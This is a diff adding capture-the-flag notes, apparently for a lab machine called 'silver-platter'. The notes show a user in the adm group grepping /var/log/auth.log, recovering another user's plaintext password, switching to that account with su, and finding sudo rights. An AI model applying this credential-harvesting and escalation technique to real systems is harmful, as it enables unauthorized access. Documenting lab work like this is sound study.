@@ -1,0 +1,16 @@
+tim@silver-platter:/home$ id
+uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
+-----------------
+The adm group in Linux is used for administrative tasks, typically granting access to system log files stored in /var/log. Members of this group can read important logs like /var/log/syslog and /var/log/auth.log, which are restricted for regular users
+------------------------------
+
+cat /var/log/auth.log | grep tyler | grep password
+
+password _Zd_zx7N823/
+
+su tyler
+
+tyler@silver-platter:/$ id
+uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
+
+tyler has sudo permissions
